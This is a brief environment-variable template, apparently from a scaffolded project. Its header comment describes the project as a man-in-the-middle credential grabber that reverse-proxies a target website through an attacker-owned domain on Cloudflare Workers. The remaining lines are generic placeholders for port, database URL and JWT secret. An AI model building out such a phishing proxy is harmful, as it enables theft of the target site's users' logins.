# build web app to deploy mitm creds grabber reverse proxying target website through user owned domain on platform Cloudflare workers — Environment Variables
# Copy to .env and fill in real values

PORT=3001
NODE_ENV=development

# Database (optional)
# DATABASE_URL=postgresql://user:pass@localhost:5432/db

# Auth (optional)
# JWT_SECRET=change-me-in-production